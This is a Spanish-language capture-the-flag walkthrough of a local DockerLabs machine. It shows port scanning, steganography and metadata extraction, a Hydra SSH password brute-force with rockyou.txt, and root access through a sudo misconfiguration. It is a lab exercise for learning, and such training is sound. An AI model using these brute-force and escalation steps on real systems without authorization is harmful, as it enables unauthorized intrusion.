Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "BorazuwarahCTF".
Una vez hecho, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
bash auto_deploy.sh borazuwarahctf.tar
```
Tras desplegarse la maquina, hacemos un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2
```
y vemos que tiene dos puertos abiertos el 22 (SSH) y el 80 (HTTP):
```
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
```
En este caso, empezaremos poniendo en el navegador esta IP y ver si en la pagina, existe alguna informacion "util".
Vemos una pagina con una foto de un huevo Kinder. Si presionamos "CTRL + U", no vemos nada interesante, asi que nos bajaremos la foto para ver si hay algun mensaje oculto en ella con "wget http://172.17.0.2/imagen.jpeg ".
Ahora vamos a probar una tecnica de ocultacion de informacion llamada "Esteganografia".
Para ello, ejecutaremos STEGHIDE sobre la foto descargada:
```
steghide extract -sf imagen.jpeg

Enter passphrase: 
wrote extracted data to "secreto.txt"
```

**NOTA: Para ocultar un archivo llamado por ejemplo "archivo.txt" en una imagen "imagen.jpg" escribiriamos: 
	"steghide embed -cf imagen.jpg -ef archivo.txt"
Por su parte, si lo que queremos es extraer el archivo oculto, pondriamos: 
	"steghide extract -sf imagen.jpg**

Bueno, y ahora, volviendo a la maquina, si hacemos un "cat" sobre el archivo "secreto.txt", nos muestra:
```
cat secreto.txt

Sigue buscando, aquí no está to solución
aunque te dejo una pista....
sigue buscando en la imagen!!!
```
Gracias a la info obtenida, es el momento de intentar leer los posibles metadatos que haya en la foto con EXIFTOOL a ver si van por ahi los tiros:
```
exiftool imagen.jpeg
```
Obtenemos:
```
ExifTool Version Number         : 12.76
File Name                       : imagen.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2024:05:28 18:10:18+02:00
File Access Date/Time           : 2024:07:08 19:29:37+02:00
File Inode Change Date/Time     : 2024:07:08 19:27:29+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```
Por fin hemos obtenido un usuario: "borazuwarah".
Es momento ahora de usar HYDRA para ver si podemos obtener la contraseña de este usuario y entrar por el puerto 22 (SSH).
```
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Unos segundos despues obtenemos:
```
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
```
Es hora de intentar acceder mediante el protocolo SSH por lo que escribimos:
```
borazuwarah@172.17.0.2
```
Tras contestar "yes" a la primera pregunta e introducir la contraseña obtenida con HYDRA, vemos que ya estamos dentro. Solo nos quedaria la escalada de privilegios para tener acceso completo. Intentaremos primero con el comando "sudo -l":
```
borazuwarah@ccab7e55cb75:~$ whoami
borazuwarah

borazuwarah@ccab7e55cb75:~$ sudo -l
Matching Defaults entries for borazuwarah on ccab7e55cb75:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User borazuwarah may run the following commands on ccab7e55cb75:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
    
borazuwarah@ccab7e55cb75:~$
```
Tal y como se observa, ejecutando "/bin/bash" deberiamos tener acceso "root", por lo que simplemente escribimos:
```
borazuwarah@ccab7e55cb75:~$ sudo /bin/bash

root@ccab7e55cb75:/home/borazuwarah# whoami
root
root@ccab7e55cb75:/home/borazuwarah#
```
Y listo, tal y como se puede observar, al escribir "whoami" se ve que el acceso como "root" ha sido obtenido. Con esto la maquina estaria hecha.



